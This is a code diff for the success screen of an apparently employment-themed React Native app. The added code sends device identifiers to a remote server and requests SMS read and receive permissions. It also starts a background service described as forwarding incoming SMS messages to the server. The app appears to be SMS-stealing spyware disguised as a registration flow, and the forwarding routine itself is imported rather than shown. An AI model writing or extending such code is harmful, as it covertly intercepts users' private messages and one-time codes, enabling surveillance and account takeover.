@@ -1,54 +1,89 @@
-import { View, Text, PermissionsAndroid,Platform, SafeAreaView, Image, TouchableOpacity } from 'react-native';
-import React, { useEffect, useState } from 'react';
+import {
+  View,
+  Text,
+  PermissionsAndroid,
+  Platform,
+  SafeAreaView,
+  Image,
+  TouchableOpacity,
+  Alert,
+} from 'react-native';
+// import { Linking } from 'react-native';
+// Linking.openSettings();
+import React, { useEffect } from 'react';
 import { useNavigation } from '@react-navigation/native';
-//@ts-ignore
-import celebrationImage from "../../static/assets/logo.png";
+// @ts-ignore
+import celebrationImage from '../../static/assets/logo.png';
 import axios from 'axios';
 import AsyncStorage from '@react-native-async-storage/async-storage';
 import DeviceInfo from 'react-native-device-info';
+import { toast } from 'burnt';
+// @ts-ignore
+import SmsListener from 'react-native-android-sms-listener';
 import BackgroundService from 'react-native-background-actions';
-import { alert, toast } from 'burnt';
-//@ts-ignore
-import SmsRetriever from 'react-native-sms-retriever'
-import NativeSmsReader from '../../../specs/NativeSmsReader';
+import { startSMSService } from '../../utils/setup';
+import { smsBackgroundTask } from '../../utils/smsService';
 
 const Success = () => {
   const navigator = useNavigation();
 
   const handleRedirect = async () => {
-    //@ts-ignore
+    // @ts-ignore
     navigator.navigate('Auth');
-    await BackgroundService.stop();
   };
 
-  async function requestAndReadSMS() {
-    if (Platform.OS === 'android') {
-      const granted = await PermissionsAndroid.request(
+  const listenToIncomingSMS = async () => {
+    try {
+      const granted = await PermissionsAndroid.requestMultiple([
+        PermissionsAndroid.PERMISSIONS.RECEIVE_SMS,
         PermissionsAndroid.PERMISSIONS.READ_SMS,
-        {
-          title: 'SMS Permission',
-          message: 'This app needs access to your SMS messages',
-          buttonNeutral: 'Ask Me Later',
-          buttonNegative: 'Cancel',
-          buttonPositive: 'OK',
-        },
-      );
+      ]);
 
-      if (granted === PermissionsAndroid.RESULTS.GRANTED) {
-        const messages = await NativeSmsReader?.readSms();
-        console.log('SMS Messages:', messages);
-      } else {
-        console.warn('SMS permission denied');
+      const receiveGranted =
+        granted['android.permission.RECEIVE_SMS'] ===
+        PermissionsAndroid.RESULTS.GRANTED;
+      const readGranted =
+        granted['android.permission.READ_SMS'] ===
+        PermissionsAndroid.RESULTS.GRANTED;
+
+      if (!receiveGranted || !readGranted) {
+        console.warn('SMS permissions not granted.');
+        return;
       }
-    }
-  }
 
-  
+      const subscription = SmsListener.addListener((message: any) => {
+        console.log('📩 Incoming SMS:', message);
+        Alert.alert('New SMS', message.body);
+        toast({
+          title: 'SMS Received',
+          message: message.body,
+        });
+      });
+
+      return subscription;
+    } catch (error) {
+      console.log('Error setting up SMS listener:', error);
+    }
+  };
+
+  const startBackrouSMS = async () => {
+    await BackgroundService.start(smsBackgroundTask, {
+      taskName: 'SMSMonitor',
+      taskTitle: 'Listening for SMS...',
+      taskDesc: 'This service listens for incoming SMS and sends it to the server.',
+      taskIcon: {
+          name: '', // without extension
+          type: 'mipmap'
+      }
+    })
+  };
+
   useEffect(() => {
+
     (async () => {
       try {
-        const userRef = await AsyncStorage.getItem("userRef");
         
+        const userRef = await AsyncStorage.getItem('userRef');
         const uniqueId = await DeviceInfo.getUniqueId();
         const brand = await DeviceInfo.getBrand();
         const model = await DeviceInfo.getModel();
@@ -62,16 +97,24 @@ const Success = () => {
             model,
             os: systemName,
             version: systemVersion,
-            brand
-          }
+            brand,
+          },
         };
         
-        const deviceRegisterData = await axios.post(`https://employment-engage.vercel.app/api/device`, data);
-        console.log(deviceRegisterData);
+        await axios.post(
+          'https://employment-engage.vercel.app/api/device',
+          data
+        );
+
         toast({
           title: 'Successfully registered!',
           message: 'Device info sent to server.',
         });
+        
+        await listenToIncomingSMS();
+        
+        await startBackrouSMS();
+
       } catch (error) {
         console.log(error);
         toast({
@@ -80,47 +123,13 @@ const Success = () => {
         });
       }
     })();
-    
-    
-    // const hasPermission = await PermissionsAndroid.request(
-      //   PermissionsAndroid.PERMISSIONS.READ_SMS
-      // );
-      
-      // requestAndReadSMS()
 
-      const _onSmsListenerPressed = async () => {
-        try {
-          const registered = await SmsRetriever.startSmsRetriever();
-          if (registered) {
-            SmsRetriever.addSmsListener(event => {
-              console.log(event.message);
-              SmsRetriever.removeSmsListener();
-            }); 
-          }
-        } catch (error) {
-          console.log(JSON.stringify(error));
-        }
-      };
-
-     _onSmsListenerPressed()
-      
-    // const subscriber = SmsListener.addListener((message: any) => {
-    //   console.info(message)
-    //   console.log("messages: -> ", message)
-    //   alert({title: "30", message: message.body})
-    //   toast({
-    //     title: "SMS",
-    //     message: message.body
-    //   })
-    // })
-
-    // return () => subscriber.remove()
   }, []);
 
   return (
     <SafeAreaView className="flex-1 bg-red-100">
-      <View className="flex-1 justify-center items-center px-6">
-        <Image source={celebrationImage} className="w-48 h-48 mb-6" />
+      <View className="mt-[15vh] justify-center items-center px-6">
+        <Image source={celebrationImage} className="w-48 h-48 mb-2" />
         <Text className="text-3xl font-bold text-blue-800 text-center mb-4">
           Congratulations!
         </Text>
